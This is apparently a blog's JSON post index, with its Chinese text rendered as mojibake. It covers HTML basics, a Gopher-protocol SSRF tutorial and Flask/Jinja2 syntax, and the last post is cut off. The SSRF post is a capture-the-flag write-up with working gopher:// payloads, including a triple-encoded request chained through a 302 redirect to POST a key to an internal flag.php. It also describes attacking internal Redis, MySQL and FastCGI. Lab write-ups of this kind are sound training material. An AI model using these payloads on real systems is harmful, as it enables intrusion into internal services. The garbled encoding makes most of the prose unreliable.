altï¼šæä¾›åŒºåŸŸçš„æ›¿ä»£æ–‡æœ¬ï¼Œæœ‰åŠ©äºæ— éšœç¢è®¿é—®ã€‚ targetï¼šæŒ‡å®šé“¾æ¥æ‰“å¼€çš„ç›®æ ‡çª—å£æˆ–æ¡†æ¶ã€‚ 2.coords å±æ€§ç”¨äºå®šä¹‰ä¸€ä¸ªåŒºåŸŸï¼ˆé€šå¸¸æ˜¯å›¾åƒåœ°å›¾ä¸­çš„çƒ­ç‚¹åŒºåŸŸï¼‰çš„åæ ‡ã€‚å›¾åƒåœ°å›¾å…è®¸ä½ å°†ä¸€ä¸ªå›¾åƒåˆ†å‰²æˆå¤šä¸ªå¯ç‚¹å‡»çš„åŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸéƒ½é“¾æ¥åˆ°ä¸åŒçš„ URL æˆ–è§¦å‘ä¸åŒçš„åŠ¨ä½œã€‚ coords å±æ€§çš„å€¼æ˜¯ä¸€ä¸ªç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œæ•°å­—ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚è¿™äº›æ•°å­—ä»£è¡¨çƒ­ç‚¹åŒºåŸŸçš„åæ ‡ã€‚å¯¹äºä¸åŒçš„ shape å€¼ï¼Œcoords å±æ€§çš„æ ¼å¼ä¼šæœ‰æ‰€ä¸åŒï¼š rectï¼šå·¦ä¸Šè§’çš„ x å’Œ y åæ ‡ï¼Œå³ä¸‹è§’çš„ x å’Œ y åæ ‡ã€‚ circleï¼šåœ†å¿ƒçš„ x å’Œ y åæ ‡ï¼Œç„¶åæ˜¯åŠå¾„ã€‚ polyï¼šå¤šè¾¹å½¢æ¯ä¸ªé¡¶ç‚¹çš„ x å’Œ y åæ ‡ï¼Œé¡¶ç‚¹åæ ‡ä¾æ¬¡æ’åˆ—ã€‚ HTMLå¤´éƒ¨ åœ¨ headå…ƒç´ ä¸­ä½ å¯ä»¥æ’å…¥è„šæœ¬ï¼ˆscriptsï¼‰, æ ·å¼æ–‡ä»¶ï¼ˆCSSï¼‰ï¼ŒåŠå„ç§metaä¿¡æ¯ã€‚å¯ä»¥æ·»åŠ åœ¨å¤´éƒ¨åŒºåŸŸçš„å…ƒç´ æ ‡ç­¾ä¸º: title, style, meta, link, script, noscript å’Œ base **title**å…ƒç´ (title) æ ‡ç­¾å®šä¹‰äº†ä¸åŒæ–‡æ¡£çš„æ ‡é¢˜,åœ¨ HTML/XHTML æ–‡æ¡£ä¸­æ˜¯å¿…éœ€çš„, å®šä¹‰äº†æµè§ˆå™¨å·¥å…·æ çš„æ ‡é¢˜ æ˜¾ç¤ºåœ¨æ”¶è—å¤¹ä¸­çš„æ ‡é¢˜ æ˜¾ç¤ºåœ¨æœç´¢å¼•æ“ç»“æœé¡µé¢çš„æ ‡é¢˜ baseå…ƒç´ (base) æè¿°äº†åŸºæœ¬çš„é“¾æ¥åœ°å€/é“¾æ¥ç›®æ ‡ï¼Œè¯¥æ ‡ç­¾ä½œä¸ºHTMLæ–‡æ¡£ä¸­æ‰€æœ‰çš„é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥: link å…ƒç´ (link) æ ‡ç­¾å®šä¹‰äº†æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»ï¼Œé€šå¸¸ç”¨äºé“¾æ¥åˆ°æ ·å¼è¡¨ head link rel=stylesheet type=text/css href=mystyle.css /head style å…ƒç´ (style) å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶å¼•ç”¨åœ°å€ï¼Œåœ¨style å…ƒç´ ä¸­ä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ æ ·å¼æ¥æ¸²æŸ“ HTML æ–‡æ¡£: meta å…ƒç´ (meta) META å…ƒç´ ï¼ˆä¸€èˆ¬æ”¾åœ¨headï¼‰ç”¨äºæŒ‡å®šç½‘é¡µçš„æè¿°ï¼Œå…³é”®è¯ï¼Œæ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œä½œè€…ï¼Œå’Œå…¶ä»–å…ƒæ•°æ®ï¼ˆå…ƒæ•°æ®ä¹Ÿä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†ä¼šè¢«æµè§ˆå™¨è§£æï¼‰å…ƒæ•°æ®å¯ä»¥ä½¿ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»–WebæœåŠ¡ script å…ƒç´ (script) ç”¨äºåŠ è½½è„šæœ¬æ–‡ä»¶ï¼Œå¦‚ï¼š JavaScript HTML CSS CSS å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ·»åŠ åˆ°HTMLä¸­: å†…è”æ ·å¼- åœ¨HTMLå…ƒç´ ä¸­ä½¿ç”¨style å±æ€§ å†…éƒ¨æ ·å¼è¡¨ -åœ¨HTMLæ–‡æ¡£å¤´éƒ¨ head åŒºåŸŸä½¿ç”¨style å…ƒç´  æ¥åŒ…å«CSS å¤–éƒ¨å¼•ç”¨ - ä½¿ç”¨å¤–éƒ¨ CSS æ–‡ä»¶ å†…è”æ ·å¼ background-colorï¼ˆèƒŒæ™¯è‰²å±æ€§ï¼‰å®šä¹‰ä¸€ä¸ªå…ƒç´ çš„èƒŒæ™¯é¢œè‰² font-familyï¼ˆå­—ä½“ï¼‰ï¼Œcolorï¼ˆé¢œè‰²ï¼‰ï¼Œå’Œfont-sizeï¼ˆå­—ä½“å¤§å°ï¼‰å±æ€§å®šä¹‰å­—ä½“çš„æ ·å¼ text-alignï¼ˆæ–‡å­—å¯¹é½ï¼‰å±æ€§æŒ‡å®šæ–‡æœ¬çš„æ°´å¹³ä¸å‚ç›´å¯¹é½æ–¹å¼ å†…éƒ¨æ ·å¼è¡¨ å½“å•ä¸ªæ–‡ä»¶éœ€è¦ç‰¹åˆ«æ ·å¼æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å†…éƒ¨æ ·å¼è¡¨ å¤–éƒ¨æ ·å¼è¡¨ å½“æ ·å¼éœ€è¦è¢«åº”ç”¨åˆ°å¾ˆå¤šé¡µé¢çš„æ—¶å€™ï¼Œä½¿ç”¨å¤–éƒ¨æ ·å¼è¡¨ï¼Œå¯ä»¥é€šè¿‡æ›´æ”¹ä¸€ä¸ªæ–‡ä»¶æ¥æ”¹å˜æ•´ä¸ªç«™ç‚¹çš„å¤–è§‚ã€‚ HTMLè¡¨æ ¼ ç”± table æ ‡ç­¾æ¥å®šä¹‰ã€‚æ˜¯ä¸€ç§ç”¨äºå±•ç¤ºç»“æ„åŒ–æ•°æ®çš„æ ‡è®°è¯­è¨€å…ƒç´ ã€‚ trï¼štr æ˜¯ table row çš„ç¼©å†™ï¼Œè¡¨ç¤ºè¡¨æ ¼çš„ä¸€è¡Œã€‚ tdï¼štd æ˜¯ table data çš„ç¼©å†™ï¼Œè¡¨ç¤ºè¡¨æ ¼çš„æ•°æ®å•å…ƒæ ¼ï¼ˆæ¯è¡Œè¢«åˆ†å‰²ä¸ºè‹¥å¹²å•å…ƒæ ¼ï¼‰ thï¼šth æ˜¯ table headerçš„ç¼©å†™ï¼Œè¡¨ç¤ºè¡¨æ ¼çš„è¡¨å¤´å•å…ƒæ ¼ã€‚ å¦‚æœä¸å®šä¹‰è¾¹æ¡†å±æ€§ï¼Œè¡¨æ ¼å°†ä¸æ˜¾ç¤ºè¾¹æ¡†table border=0 tfoot å¯ç”¨äºåœ¨è¡¨æ ¼çš„åº•éƒ¨å®šä¹‰æ‘˜è¦ã€ç»Ÿè®¡ä¿¡æ¯ç­‰å†…å®¹ã€‚ caption å¯ç”¨äºä¸ºæ•´ä¸ªè¡¨æ ¼å®šä¹‰æ ‡é¢˜ã€‚ è·¨è¡Œæˆ–è·¨åˆ—çš„è¡¨æ ¼å•å…ƒæ ¼ cellspacing=â€œ10â€==å•å…ƒæ ¼é—´è·=â€œ10â€ cellpadding=â€œ10â€==å•å…ƒæ ¼è¾¹è·=â€œ10â€ HTML åˆ—è¡¨ HTMLæ— åºåˆ—è¡¨ æ— åºåˆ—è¡¨æ˜¯ä¸€ä¸ªé¡¹ç›®çš„åˆ—è¡¨ï¼Œæ­¤åˆ—é¡¹ç›®ä½¿ç”¨ç²—ä½“åœ†ç‚¹ï¼ˆå…¸å‹çš„å°é»‘åœ†åœˆï¼‰è¿›è¡Œæ ‡è®°ã€‚ æ— åºåˆ—è¡¨ä½¿ç”¨ ul æ ‡ç­¾å®šä¹‰ï¼Œè¡¨ç¤ºé¡¹ç›®ä¹‹é—´æ²¡æœ‰é¡ºåºå…³ç³»ã€‚åˆ—è¡¨é¡¹ç”¨ li æ ‡ç­¾è¡¨ç¤º HTML æœ‰åºåˆ—è¡¨ åˆ—è¡¨é¡¹ç›®ä½¿ç”¨æ•°å­—è¿›è¡Œæ ‡è®°ã€‚ æœ‰åºåˆ—è¡¨å§‹äº ol æ ‡ç­¾ã€‚æ¯ä¸ªåˆ—è¡¨é¡¹å§‹äº li æ ‡ç­¾ã€‚ åˆ—è¡¨é¡¹ä½¿ç”¨æ•°å­—æ¥æ ‡è®°ã€‚ HTML è‡ªå®šä¹‰åˆ—è¡¨ è‡ªå®šä¹‰åˆ—è¡¨ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚ è‡ªå®šä¹‰åˆ—è¡¨ä»¥ dl æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ dt å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ dd å¼€å§‹ã€‚ HTML å¸ƒå±€ ä½¿ç”¨div å…ƒç´  ä½¿ç”¨è¡¨æ ¼ HTMLè¡¨å• HTML è¡¨å•ç”¨äºæ”¶é›†ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯ï¼Œå¦‚ï¼šæ–‡æœ¬åŸŸï¼ˆtextareaï¼‰ã€ä¸‹æ‹‰åˆ—è¡¨ï¼ˆselectï¼‰ã€å•é€‰æ¡†ï¼ˆradio-buttonsï¼‰ã€å¤é€‰æ¡†ï¼ˆcheckboxï¼‰ ç­‰ç­‰ã€‚è¡¨ç¤ºæ–‡æ¡£ä¸­çš„ä¸€ä¸ªåŒºåŸŸï¼Œæ­¤åŒºåŸŸåŒ…å«äº¤äº’æ§ä»¶ï¼Œå°†ç”¨æˆ·æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ° Web æœåŠ¡å™¨ã€‚é€šå¸¸åŒ…å«å„ç§è¾“å…¥å­—æ®µã€å¤é€‰æ¡†ã€å•é€‰æŒ‰é’®ã€ä¸‹æ‹‰åˆ—è¡¨ç­‰å…ƒç´ ã€‚ form å…ƒç´ ç”¨äºåˆ›å»ºè¡¨å• action å±æ€§å®šä¹‰äº†è¡¨å•æ•°æ®æäº¤çš„ç›®æ ‡ URL method å±æ€§å®šä¹‰äº†æäº¤æ•°æ®çš„ HTTP æ–¹æ³•ï¼ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯ â€œpostâ€ï¼‰ã€‚ label å…ƒç´ ç”¨äºä¸ºè¡¨å•å…ƒç´ æ·»åŠ æ ‡ç­¾ï¼Œæé«˜å¯è®¿é—®æ€§ã€‚ input å…ƒç´ æ˜¯æœ€å¸¸ç”¨çš„è¡¨å•å…ƒç´ ä¹‹ä¸€ï¼Œå®ƒå¯ä»¥åˆ›å»ºæ–‡æœ¬è¾“å…¥æ¡†ã€å¯†ç æ¡†ã€å•é€‰æŒ‰é’®ã€å¤é€‰æ¡†ç­‰ã€‚ type å±æ€§å®šä¹‰äº†è¾“å…¥æ¡†çš„ç±»å‹ï¼Œ id å±æ€§ä¸º HTML å…ƒç´ åˆ†é…å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºå…³è” label å…ƒç´ ï¼Œid åˆ™ä»…ç”¨äºå‰ç«¯æ“ä½œã€‚ä¸€ä¸ªé¡µé¢ä¸­æ¯ä¸ª id å¿…é¡»å”¯ä¸€ï¼Œé€šè¿‡ JavaScript æˆ– CSS å¯ä»¥å¿«é€Ÿå®šä½ç‰¹å®šå…ƒç´  class å±æ€§ä¸º HTML å…ƒç´ åˆ†é…ä¸€ä¸ªæˆ–å¤šä¸ªç±»åï¼Œç”¨äºåˆ†ç»„å’Œæ ·å¼æ§åˆ¶ name å±æ€§ç”¨äºæ ‡è¯†è¡¨å•å­—æ®µï¼Œæ˜¯è¡¨å•æäº¤çš„å…³é”®ï¼Œ value ç”¨äºä¸ºè¡¨å•å­—æ®µè®¾ç½®é»˜è®¤å€¼/å½“å‰å€¼å½“ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œvalue çš„å€¼å°†ä½œä¸ºè¯¥å­—æ®µçš„å€¼è¢«å‘é€åˆ°æœåŠ¡å™¨ value å’Œ name é€šå¸¸æ˜¯åŒæ—¶ä½¿ç”¨çš„ï¼Œname æŒ‡å®šå­—æ®µçš„åç§°ï¼ˆé”®åï¼‰ï¼Œvalue æŒ‡å®šå­—æ®µçš„å€¼ã€‚ select å…ƒç´ ç”¨äºåˆ›å»ºä¸‹æ‹‰åˆ—è¡¨ï¼Œè€Œ option å…ƒç´ ç”¨äºå®šä¹‰ä¸‹æ‹‰åˆ—è¡¨ä¸­çš„é€‰é¡¹ã€‚ requiredæŒ‡å®šæ­¤è¾“å…¥æ¡†ä¸ºå¿…å¡«å­—æ®µã€‚ è¾“å…¥ç±»å‹ æ–‡æœ¬è¾“å…¥ (input type=text): å…è®¸ç”¨æˆ·è¾“å…¥æ–‡æœ¬ã€‚ input type=text name=username placeholder=Enter your username placeholderæä¾›è¾“å…¥æç¤ºï¼Œä¸ä¼šä½œä¸ºå­—æ®µçš„å®é™…å€¼æäº¤åˆ°æœåŠ¡å™¨ã€‚ é™„ï¼šæ–‡æœ¬åŸŸï¼ˆæ‹‰å³ä¸‹è§’å¯ç§»åŠ¨ï¼‰ï¼šç”¨æˆ·å¯åœ¨æ–‡æœ¬åŸŸä¸­å†™å…¥æ–‡æœ¬ã€‚å¯å†™å…¥å­—ç¬¦çš„å­—æ•°ä¸å—é™åˆ¶ã€‚ å¯†ç è¾“å…¥ (input type=password): ç”¨äºè¾“å…¥å¯†ç ï¼Œè¾“å…¥å†…å®¹ä¼šæ˜¾ç¤ºä¸ºç‚¹æˆ–æ˜Ÿå·ã€‚ input type=password name=password placeholder=Enter your password ç”µå­é‚®ä»¶è¾“å…¥ (input type=email): ç”¨äºè¾“å…¥ç”µå­é‚®ä»¶åœ°å€ï¼Œä¼šè‡ªåŠ¨éªŒè¯ç”µå­é‚®ä»¶æ ¼å¼ã€‚ input type=email name=email placeholder=Enter your email æ•°å­—è¾“å…¥ (input type=number): ç”¨äºè¾“å…¥æ•°å­—ï¼Œå¯ä»¥åŒ…æ‹¬å°æ•°ç‚¹å’Œè´Ÿæ•°ã€‚ input type=number name=age placeholder=Your age æœç´¢æ¡† (input type=search): ç”¨äºæœç´¢ï¼Œé€šå¸¸ä¼šæ˜¾ç¤ºä¸ºä¸€ä¸ªæœç´¢æ¡†ã€‚ input type=search name=search placeholder=Search... å•é€‰æŒ‰é’® (input type=radio): å…è®¸ç”¨æˆ·åœ¨ä¸€ç»„é€‰é¡¹ä¸­é€‰æ‹©ä¸€ä¸ªã€‚ å¤é€‰æ¡† (input type=checkbox): å…è®¸ç”¨æˆ·é€‰æ‹©å¤šä¸ªé€‰é¡¹ã€‚ ä¸‹æ‹‰åˆ—è¡¨ä¸‹æ‹‰åˆ—è¡¨æ¡†æ˜¯ä¸€ä¸ªå¯é€‰åˆ—è¡¨ã€‚ å¦‚æœé¢„é€‰aï¼Œåˆ™option value=a selecteda/option æäº¤æŒ‰é’® (input type=submit): æäº¤è¡¨å•æ•°æ®ã€‚ input type=submit value=Submit é‡ç½®æŒ‰é’® (input type=reset): é‡ç½®è¡¨å•è¾“å…¥å­—æ®µä¸ºåˆå§‹å€¼ã€‚ input type=reset value=Reset éšè—è¾“å…¥ (input type=hidden): ç”¨äºéšè—æ•°æ®ï¼Œç”¨æˆ·ä¸å¯è§ã€‚ input type=hidden name=hiddenField value=hiddenValue æ–‡ä»¶ä¸Šä¼  (input type=file): å…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ã€‚ input type=file name=fileUpload æŒ‰é’® (input type=button): åˆ›å»ºä¸€ä¸ªå¯ç‚¹å‡»çš„æŒ‰é’®ï¼Œä½†ä¸ä¼šæäº¤è¡¨å•ã€‚ input type=button value=Click Me é¢œè‰²é€‰æ‹©å™¨ (input type=color): å…è®¸ç”¨æˆ·é€‰æ‹©é¢œè‰²ã€‚ input type=color name=favcolor value=#ff0000 æ—¥æœŸé€‰æ‹©å™¨ (input type=date): å…è®¸ç”¨æˆ·é€‰æ‹©æ—¥æœŸã€‚ input type=date name=birthday æ—¶é—´é€‰æ‹©å™¨ (input type=time): å…è®¸ç”¨æˆ·é€‰æ‹©æ—¶é—´ã€‚ input type=time name=time æ—¥æœŸå’Œæ—¶é—´é€‰æ‹©å™¨ (input type=datetime-local): å…è®¸ç”¨æˆ·é€‰æ‹©æ—¥æœŸå’Œæ—¶é—´ã€‚ input type=datetime-local name=eventtime æœˆé€‰æ‹©å™¨ (input type=month): å…è®¸ç”¨æˆ·é€‰æ‹©æœˆä»½å’Œå¹´ä»½ã€‚ input type=month name=birthdate å‘¨é€‰æ‹©å™¨ (input type=week): å…è®¸ç”¨æˆ·é€‰æ‹©ä¸€å‘¨ã€‚ input type=week name=week è¿™äº›è¾“å…¥å…ƒç´ å¯ä»¥åŒ…å«åœ¨ form å…ƒç´ ä¸­ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ form å…ƒç´ çš„ action å±æ€§æŒ‡å®šæäº¤æ•°æ®çš„ URLï¼Œé€šè¿‡ method å±æ€§æŒ‡å®šæäº¤æ•°æ®çš„æ–¹å¼ï¼ˆé€šå¸¸æ˜¯ GET æˆ– POSTï¼‰ã€‚ form action=/submit-form method=post !-- è¾“å…¥å…ƒç´ æ”¾åœ¨è¿™é‡Œ -- input type=text name=username placeholder=Enter your username input type=submit value=Submit/form åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå½“ç”¨æˆ·å¡«å†™ç”¨æˆ·åå¹¶ç‚¹å‡»æäº¤æŒ‰é’®æ—¶ï¼Œè¡¨å•æ•°æ®å°†é€šè¿‡ POST æ–¹æ³•å‘é€åˆ° /submit-form URLã€‚ HTMLæ¡†æ¶ é€šè¿‡ä½¿ç”¨æ¡†æ¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªæµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºä¸æ­¢ä¸€ä¸ªé¡µé¢ã€‚ iframeè¯­æ³• iframe src=URL/iframe iframeä½œç”¨ è®¾ç½®é«˜åº¦ä¸å®½åº¦ ç§»é™¤è¾¹æ¡† frameborder å±æ€§å®šä¹‰iframeè¡¨ç¤ºæ˜¯å¦æ˜¾ç¤ºè¾¹æ¡†ã€‚è®¾ç½®å±æ€§å€¼ä¸º â€œ0â€ ç§»é™¤iframeçš„è¾¹æ¡† æ˜¾ç¤ºç›®æ ‡é“¾æ¥é¡µé¢ iframe å¯ä»¥æ˜¾ç¤ºä¸€ä¸ªç›®æ ‡é“¾æ¥çš„é¡µé¢ HTML è„šæœ¬ï¼ˆJavaScriptï¼‰ HTML é€ŸæŸ¥åˆ—è¡¨ [][HTML é€ŸæŸ¥åˆ—è¡¨ | èœé¸Ÿæ•™ç¨‹ (runoob.com)]https://www.runoob.com/html/html-quicklist.html è¡¨å• æœç´¢ ç”¨æˆ·å å¯†ç  é‚®ç®± æ€§åˆ« ç”· å¥³ è®¢é˜…æ¨é€ä¿¡æ¯ å›½å®¶ CN USA UK","tags":["å‰ç«¯","HTML"],"categories":["å‰ç«¯"]},{"title":"Gopheråè®®","path":"/2025/07/09/Gopheråè®®/","content":"Gopheråè®® æ¦‚è¿° Gopheræ˜¯äº’è”ç½‘æ—©æœŸçš„ä¸€ç§åè®® åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ åˆ©ç”¨gopheråè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Redisã€Mysqlã€FastCGIã€Ftp ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚ï¼Œè¿™å¯ä»¥æ‹“å®½ SSRF çš„æ”»å‡»é¢ æ ¼å¼ gopher://host:port/gopher-path_åæ¥TCPæ•°æ®æµ gopherçš„é»˜è®¤ç«¯å£æ˜¯70 å¦‚æœæ˜¯postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œè¦ç”¨åˆ°%0d%0a(postè¯·æ±‚æœ‰å‡ ä¸ªå¿…å¤‡è¯·æ±‚å¤´) åŸºäºpostè¯·æ±‚ï¼Œå¦‚æœæœ‰å¤šä¸ªå‚æ•°ï¼Œä¹Ÿè¦æŠŠè¿›è¡ŒURLç¼–ç (%26) Gopherå‘é€HTTPè¯·æ±‚ gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®® GETå‹ æ ¼å¼ æ„é€ HTTPæ•°æ®åŒ… URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a å‘é€gopheråè®® é—®å·ï¼ˆï¼Ÿï¼‰éœ€è¦è½¬ç ä¸ºURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3f å›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0a,ä½†å¦‚æœç›´æ¥ç”¨å·¥å…·è½¬ï¼Œå¯èƒ½åªä¼šæœ‰%0a åœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸï¼ˆå…·ä½“å¯ç ”ç©¶HTTPåŒ…ç»“æŸï¼‰ ç¤ºä¾‹ æºç ï¼š ?php echo Hello .$_GET[name]. ? è¯·æ±‚ï¼š GET /ssrf/get.php?name=ikunma HTTP/1.1Host: 127.0.0.1 æ„é€ è¯·æ±‚åŒ…ï¼š gopher://127.0.0.1/_GET /ssrf/get.php?name=ikunma HTTP/1.1Host: 127.0.0.1 ç¼–ç ï¼ˆè¿™è¾¹æ˜¯ä¸€æ¬¡ï¼Œæœ‰çš„è¦ä¸¤æ¬¡ï¼‰ gopher://127.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=ikunma%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A æ³¨ï¼šURL ç¼–ç ä¸­ï¼Œ%0A å’Œ %0a å®é™…ä¸Šæ˜¯è¡¨ç¤ºç›¸åŒçš„å­—ç¬¦ï¼Œå³æ¢è¡Œç¬¦ã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åœ¨äºå¤§å°å†™ã€‚åœ¨ URL ç¼–ç ä¸­ï¼Œå­—æ¯çš„å¤§å°å†™é€šå¸¸æ˜¯ä¸æ•æ„Ÿçš„ï¼Œå› æ­¤ %0A å’Œ %0a éƒ½ä¼šè¢«è§£é‡Šä¸ºæ¢è¡Œç¬¦ POSTå‹ æ ¼å¼ï¼š POST /ssrf/post.php HTTP/1.1host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=ikunma å†™åŒ…ï¼š gopher://127.0.0.1:80/_POST /ssrf/base/post.php HTTP/1.1Host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=ikunma urlç¼–ç ï¼ˆå®é™…æ“ä½œè¦ä¸¤æ¬¡ï¼‰ï¼š gopher://127.0.0.1:80/_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0A%0D%0Aname%3Dikunma%0D%0A ç¼–ç æ¬¡æ•° ä¼ å‚ç»è¿‡å¤šå°‘æ¬¡è·³è½¬å°±éœ€è¦ç»è¿‡å¤šå°‘æ¬¡urlç¼–ç  ç›´æ¥curlåæ¥gopher://å°±ç¼–ç ä¸€æ¬¡ åˆ©ç”¨?url=gopher://å°±ç¼–ç ä¸¤æ¬¡ è¿˜ç»è¿‡302è·³è½¬ï¼Œå°±ç¼–ç ä¸‰æ¬¡ã€‚ ä¾‹é¢˜ CTFHub-SSRFç³»åˆ—-POSTè¯·æ±‚ å…ˆæœ¬åœ°è®¿é—® ?url=127.0.0.1/flag.php æºç ï¼š form action=/flag.php method=postinput type=text name=key!-- Debug: key=a1fd25f0d3ac467c1368019781a49713--/form å†è®¿é—®ä¸€ä¸‹302.php /302.php æºç ï¼š !DOCTYPE HTML PUBLIC -//IETF//DTD HTML 2.0//ENhtmlheadtitle404 Not Found/title/headbodyh1Not Found/h1pThe requested URL /302.php was not found on this server./phraddressApache/2.4.25 (Debian) Server at challenge-c47c6ea85c502c46.sandbox.ctfhub.com Port 10800/address/body/html è¿™é‡Œé€šè¿‡302.phpçš„è·³è½¬æ¥å®ç°gopheråè®®ä¼ªé€  å°† 127.0.0.1/302.php?url=gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=a1fd25f0d3ac467c1368019781a49713 urlç¼–ç 3æ¬¡ 127.0.0.1%252F302.php%253Furl%253Dgopher%253A%252F%252F127.0.0.1%253A80%252F_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da1fd25f0d3ac467c1368019781a49713 æ¥åœ¨?url=ä¹‹å","tags":["Gopher"],"categories":["è®¡ç®—æœºç½‘ç»œ"]},{"title":"Flaskä¸­çš„Jinja2ç®€å•ç”¨æ³•","path":"/2025/07/09/Flaskä¸­çš„Jinja2ç®€å•ç”¨æ³•/","content":"Flaskä¸­çš„Jinja2ç®€å•ç”¨æ³• åœ¨Pythonä¸­ï¼Œè¯¥æ¼æ´å¸¸è§äºFlaskï¼ˆä¸€ä¸ªè½»é‡çº§Webåº”ç”¨æ¡†æ¶ï¼‰æ¨¡å—ä¸­ï¼ŒFlaskä½¿ç”¨Jinja2ä½œä¸ºæ¨¡æ¿å¼•æ“ æ¨¡æ¿ ...ï¼šå°†èŠ±æ‹¬å·å†…çš„å†…å®¹ä½œä¸ºè¡¨è¾¾å¼æ‰§è¡Œå¹¶è¿”å›å¯¹åº”ç»“æœã€‚ # ä¼šè¢«è§£æä¸º497*7 %...%ï¼šç”¨äºå£°æ˜å˜é‡æˆ–æ¡ä»¶/å¾ªç¯è¯­å¥ # ä½¿ç”¨setå£°æ˜å˜é‡% set name=ikun %# æ¡ä»¶è¯­å¥% if var is true %ikun%endif%# å¾ªç¯è¯­å¥% for i in range(6) %ikun%endfor% ``ï¼šæ³¨é‡Š è¯¦ç»†ç”¨æ³• å˜é‡ å…¨å±€å˜é‡ ä½¿ç”¨setè¯­å¥ % set name=ikun % ä¹‹åå°±å¯ä»¥åœ¨é¡µé¢æ–‡ä»¶ä¸­ä½¿ç”¨nameè¿™ä¸ªå˜é‡äº† å±€éƒ¨å˜é‡ ä½¿ç”¨withè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå†…éƒ¨ä½œç”¨åŸŸ % with name=ikun % name % endwith % nameå˜é‡åªèƒ½åœ¨withæ ‡ç­¾ä¸­ä½¿ç”¨ æ§åˆ¶è¯­å¥ æ§åˆ¶è¯­å¥éƒ½æ˜¯æ”¾åœ¨% ... %ä¸­ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªè¯­å¥% endxxx %æ¥è¿›è¡Œç»“æŸ ifè¯­å¥ % if user.is_admin % pWelcome, administrator!/p% elif user.is_logged_in % pWelcome back, user.name !/p% else % pPlease log in./p% endif % forè¯­å¥ æ™®é€šç”¨æ³• u1% for user in users % li user.username /li% else % lino users found/li% endfor %/u1 éå†å­—å…¸ % for key,value in my_dict.items() % dt key /dt dd value /dd% endfor % å¾ªç¯å˜é‡loop % for item in items % loop.index # å½“å‰è¿­ä»£æ¬¡æ•°ï¼ˆä»1å¼€å§‹ï¼‰ # loop.index0 # å½“å‰è¿­ä»£æ¬¡æ•°ï¼ˆä»0å¼€å§‹ï¼‰ # loop.revindex # åå‘è¿­ä»£æ¬¡æ•°ï¼ˆä»1å¼€å§‹ï¼‰ # loop.revindex0 # åå‘è¿­ä»£æ¬¡æ•°ï¼ˆä»0å¼€å§‹ï¼‰ # loop.first # 